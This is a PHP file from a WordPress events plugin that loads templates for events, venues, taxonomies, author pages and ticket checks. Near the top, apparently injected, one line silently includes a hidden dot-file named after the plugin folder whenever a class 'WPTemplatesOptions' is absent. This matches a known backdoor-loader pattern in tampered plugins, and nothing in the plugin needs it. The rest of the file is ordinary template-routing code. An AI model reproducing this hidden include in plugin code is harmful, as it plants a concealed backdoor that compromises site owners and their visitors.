<?php if ( !defined( 'ABSPATH' ) ) exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Template_Loader {

	
	public function __construct() {
     // template loader
		add_filter( 'template_include', array( $this, 'template_loader' ) );
		add_filter( 'theme_page_templates', array( $this, 'el_theme_page_templates' ), 10, 4 );
	}

	/**
     * filter template
     */
	public function template_loader( $template ) {

		$post_type = isset($_REQUEST['post_type'] ) ? $_REQUEST['post_type'] : get_post_type();
		$check_qrcode = isset( $_REQUEST['check_qrcode'] ) ? $_REQUEST['check_qrcode'] : '';

		$file = '';
		$find = array();

		if( is_page_template( 'eventlist_authors' ) ){

			$file = 'authors.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;				

		}else if ( $post_type !== 'event' && $post_type !== 'venue' && ! is_tax('event_cat')  && ! is_tax( 'event_loc' ) && ! is_tax( 'event_tag' ) && !is_author() ){
			
			return $template;
		}
		
		if ( is_post_type_archive( 'event' ) ) {

			$file = 'archive-event.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;

		} else if ( is_singular('event') ) {

			$file = 'single-event.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;


		} else if ( is_tax( 'event_cat' ) || is_tax( 'event_tag' ) || is_tax( 'event_loc' ) ) {
			
			$term = get_queried_object();

			$taxonomy = $term->taxonomy;

			$file = 'taxonomy-' . $taxonomy . '.php';

			$find[] = 'taxonomy-' . $taxonomy . '-' . $term->slug . '.php';
			$find[] = el_template_path() . '/' . 'taxonomy-' . $taxonomy . '-' . $term->slug . '.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;

		} else if ( is_post_type_archive( 'venue' ) ) {

			$file = 'archive-venue.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;

		} else if ( is_singular('venue') ) {

			$file = 'single-venue.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;


		} else if ( is_author() ) {

			$file = 'author.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;

		}

	
		// Current user can Preview Event
		if( el_can_preview_event() ){

			$file = 'single-event-preview.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;

		}

		if( $check_qrcode ){
			$file = 'ticket-info.php';
			$find[] = $file;
			$find[] = el_template_path() . '/' . $file;
			
		}

		if ( $file ) {

			$find[] = el_template_path() . $file;

			$el_template = untrailingslashit( EL_PLUGIN_PATH ) . '/templates/' . $file;

         // Find Template in theme
			$template = locate_template( array_unique( $find ) );

         // If template doesn't have in theme, it will get in plugin
			if ( !$template && file_exists( $el_template ) ) {
				$template = $el_template;
			}

		}




		return $template;
	}

	public function el_theme_page_templates( $page_templates, $wp_theme, $post ){

		
		$page_templates = [
			'eventlist_authors' => _x( 'Authors', 'Page Template', 'eventlist' ),
		] + $page_templates;

		return $page_templates;

	}

}

new EL_Template_Loader();
